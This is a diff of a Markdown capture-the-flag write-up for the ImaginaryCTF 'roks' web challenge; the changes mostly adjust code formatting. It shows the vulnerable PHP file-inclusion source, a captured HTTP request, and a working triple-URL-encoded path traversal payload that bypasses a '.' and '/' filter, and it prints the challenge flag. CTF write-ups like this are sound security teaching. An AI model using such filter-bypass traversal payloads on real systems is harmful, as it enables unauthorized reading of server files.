@@ -19,7 +19,7 @@ When going to the site you are greeted by a button that picks a random picture o
 
 If you intercept the request with burp, we see it uses ==file== inclusion. So I am thinking path traversal.
 
-```GET /file.php?file=image4 HTTP/1.1
+`GET /file.php?file=image4 HTTP/1.1
 Host: roks.chal.imaginaryctf.org
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
 Accept: */*
@@ -27,16 +27,16 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Referer: http://roks.chal.imaginaryctf.org/
-Cookie: _ga_0LKSSBL38W=GS1.1.1690084714.5.1.1690084784.0.0.0; _ga=GA1.1.865862315.1690061016; _ga_BHMLHVLGF2=GS1.1.1690079570.3.0.1690079574.0.0.0```
+Cookie: _ga_0LKSSBL38W=GS1.1.1690084714.5.1.1690084784.0.0.0; _ga=GA1.1.865862315.1690061016; _ga_BHMLHVLGF2=GS1.1.1690079570.3.0.1690079574.0.0.0`
 
 However, when we try to path traverse we recieve the ==stop hacking you hackers== image.
 
-/file.php?file=../../../../../../flag.png == stop hacking you hackers
+`/file.php?file=../../../../../../flag.png == stop hacking you hackers`
 
 Lets take a look at the provided source code:
 
 
-```<?php
+`<?php
   $filename = urldecode($_GET["file"]);
   if (str_contains($filename, "/") or str_contains($filename, ".")) {
     $contentType = mime_content_type("stopHacking.png");
@@ -48,7 +48,7 @@ Lets take a look at the provided source code:
     header("Content-type: $contentType");
     readfile($filePath);
   }
-?>```
+?>`
 
 Website dosent allow "." or "/"
 
@@ -62,7 +62,7 @@ CyberChef will encode "." if you check the "encode all special characters
 
 It also allows you to string together multiple encodes.
 
-%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fflag%252Epng
+`%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fflag%252Epng`
 
 
 We still get stop hacking image
@@ -71,6 +71,6 @@ I did some more enumeration and went to robots.txt and we see the site is made w
 
 If we url encode 3 times we should be able to path traverse
 
-request sent: http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng
+request sent: `http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng`
 
-flag: `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}``
+flag: `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`
